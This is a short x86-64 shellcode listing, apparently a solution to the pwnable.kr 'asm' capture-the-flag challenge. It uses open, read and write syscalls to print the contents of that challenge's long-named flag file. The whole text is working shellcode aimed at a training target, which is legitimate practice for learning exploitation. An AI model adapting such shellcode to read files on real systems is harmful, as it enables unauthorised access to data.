; Open (the flag)
mov rax, 0x02
mov rdi, 0x4141407e
mov rdx, 0
syscall
; Read (the contents of the flag)
sub rsp, 1000
mov rbx, rax
mov rax, 0
mov rdi, rbx
mov rsi, rsp
mov rdx, 1000
syscall
; Write (to stdout)
mov rbx, rax
mov rax, 1
mov rdi, 1
mov rsi, rsp
mov rdx, rbx
syscall
; Flag name
flag: .ascii "this_is_pwnable\x2ekr_flag_file_please_read_this_file\x2esorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong\0"
